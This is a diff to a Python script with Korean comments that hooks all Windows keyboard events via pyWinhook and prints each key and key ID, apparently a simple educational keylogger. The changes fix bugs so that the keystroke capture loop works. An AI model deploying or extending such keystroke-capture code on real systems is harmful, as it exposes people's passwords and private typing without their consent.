@@ -6,6 +6,9 @@ import win32gui
 import pythoncom
 import pyWinhook as pyHook
 
+#변수는 생성
+curWindow = None
+
 def getCurProc():
 	global curWindow
 	
@@ -27,7 +30,8 @@ def getCurProc():
 #키보드 입력을 후킹한 후 호출되는 콜백 함수
 def OnKeyboardEvent(event):
 	getCurProc()
-	print('++ Key:' %event.Key, end='')
+	print('++ Key:', event.Key, end='')
+	print('	KeyID:', event.KeyID)
 	return True
 	
 
@@ -39,7 +43,7 @@ def main():
 	hm.HookKeyboard()
 	#윈도우 OS에서 입력된 이벤트들을 모두 전송받을 수 있게 함
 	#이벤트 없으면 여기서 대기
-	pythoncom.PumpMessage()
+	pythoncom.PumpMessages()
 
 
 if __name__ == '__main__':
